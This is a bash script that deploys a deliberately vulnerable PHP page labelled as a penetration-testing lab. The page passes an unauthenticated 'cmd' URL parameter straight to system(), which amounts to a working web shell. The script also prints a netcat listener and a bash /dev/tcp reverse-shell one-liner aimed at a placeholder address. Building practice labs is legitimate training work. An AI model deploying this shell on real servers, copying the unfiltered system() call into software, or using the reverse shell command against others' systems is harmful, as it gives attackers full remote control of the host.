#!/bin/bash
# deploy_dynamic_cmd.sh - One-click vulnerable dynamic command injection web app with homepage link
# Lab use only. Stops unnecessary Apache, deploys vuln app + index.html, restarts.
set -e
echo "[*] Stopping all Apache instances..."
sudo systemctl stop apache2 2>/dev/null || true
sudo pkill -9 apache2 2>/dev/null || true
sudo pkill -9 httpd 2>/dev/null || true

echo "[*] Installing PHP + mod_php (if missing)..."
sudo apt update -qq
sudo apt install -y php libapache2-mod-php > /dev/null 2>&1

# Deploy index.html with link to dynamic_cmd.php
echo "[*] Deploying index.html (homepage with link)..."
sudo tee /var/www/html/index.html > /dev/null << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Web Lab</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; text-align: center; }
    a { color: #0f0; font-size: 1.2em; text-decoration: underline; }
  </style>
</head>
<body>
  <h1>Penetration Testing Lab</h1>
  <p><a href="/dynamic_cmd.php">→ Go to Dynamic Command Injector</a></p>
</body>
</html>
EOF

# Deploy dynamic_cmd.php (unchanged)
echo "[*] Deploying dynamic_cmd.php..."
sudo tee /var/www/html/dynamic_cmd.php > /dev/null << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Dynamic Command Injection</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    input, button { padding: 10px; font-size: 16px; }
    pre { background: #000; padding: 15px; border: 1px solid #0f0; margin-top: 10px; height: 400px; overflow: auto; }
  </style>
</head>
<body>
  <h1>Live Command Injector</h1>
  <input type="text" id="cmd" placeholder="Enter command (e.g. id; whoami)" style="width:70%">
  <button onclick="run()">Execute</button>
  <pre id="output">Ready. Type and click Execute.</pre>
<script>
async function run() {
  const cmd = document.getElementById('cmd').value.trim();
  if (!cmd) return;
 
  const output = document.getElementById('output');
  output.textContent = 'Running: ' + cmd + '\n\n';
 
  const res = await fetch(`?cmd=${encodeURIComponent('; ' + cmd)}`);
  const text = await res.text();
 
  const start = text.indexOf('Output:') + 7;
  output.textContent += text.substring(start).trim();
}
</script>
<hr><pre>
<?php
if (isset($_GET['cmd'])) {
    echo "Output:\n";
    system($_GET['cmd'] . " 2>&1");
    exit;
}
?>
</pre>
</body>
</html>
EOF

echo "[*] Starting clean Apache..."
sudo systemctl start apache2

IP=$(hostname -I | awk '{print $1}')
echo "[+] DONE!"
echo "[+] Homepage: http://$IP/  → links to Dynamic Command Injector"
echo "[+] Direct:   http://$IP/dynamic_cmd.php"
echo "[+] Test:     curl 'http://$IP/dynamic_cmd.php?cmd=id'"
echo "[+] Rev shell: nc -lvnp 4444 → then: bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
